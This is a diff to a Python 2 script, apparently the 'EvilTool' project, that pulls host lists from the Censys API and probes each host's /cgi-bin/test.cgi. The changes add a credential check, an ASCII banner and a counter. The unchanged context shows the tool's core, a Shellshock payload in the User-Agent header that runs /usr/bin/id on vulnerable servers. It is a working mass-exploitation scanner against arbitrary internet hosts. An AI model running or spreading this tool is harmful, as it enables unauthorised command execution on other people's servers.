@@ -6,12 +6,36 @@ import requests
 
 c = 0
 API_URL = "https://www.censys.io/api/v1"
-UID = " "
-SECRET = " "
+UID = ""
+SECRET = ""
 
 pages = float('inf')
 page = 1
 
+def check_conf():
+    if UID == '' or SECRET == '':
+        cprint('''
+███████╗██████╗ ██████╗  ██████╗
+██╔════╝██╔══██╗██╔══██╗██╔═══██╗
+█████╗  ██████╔╝██████╔╝██║   ██║
+██╔══╝  ██╔══██╗██╔══██╗██║   ██║
+███████╗██║  ██║██║  ██║╚██████╔╝
+╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝
+
+██╗  ██╗ ██████╗ ██╗  ██╗
+██║  ██║██╔═████╗██║  ██║
+███████║██║██╔██║███████║
+╚════██║████╔╝██║╚════██║
+     ██║╚██████╔╝     ██║
+     ╚═╝ ╚═════╝      ╚═╝
+        ''')
+        cprint('[!] - PLEASE CONFIGURE YOUR API ID AND YOUR SECRET - [!]','yellow','on_red',attrs=['bold'])
+        cprint('[!] - TUTORIAL VISIT- [!]','yellow','on_red',attrs=['bold'])
+        cprint('https://github.com/mthbernardes/EvilTool/blob/master/README.md','yellow','on_red',attrs=['bold'])
+        print
+        exit()
+    else:
+        pass
 
 def banner():
     cprint('''
@@ -50,6 +74,7 @@ still present after the incorrect fix.
     ''','red')
 
 def menu():
+    check_conf()
     banner()
     cprint('''
   ▄▄▄▄███▄▄▄▄      ▄████████ ███▄▄▄▄   ███    █▄
@@ -92,9 +117,12 @@ def search(API_URL,UID,SECRET,page,pages):
         pages += 1
 
 def build_url(res_json):
+    c= 0
     for info in res_json['results']:
         full_url = 'http://'+info['ip']+'/cgi-bin/test.cgi'
         test_conn(full_url)
+        c += 1
+    print c
 
 def test_conn(url):
     user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id"}
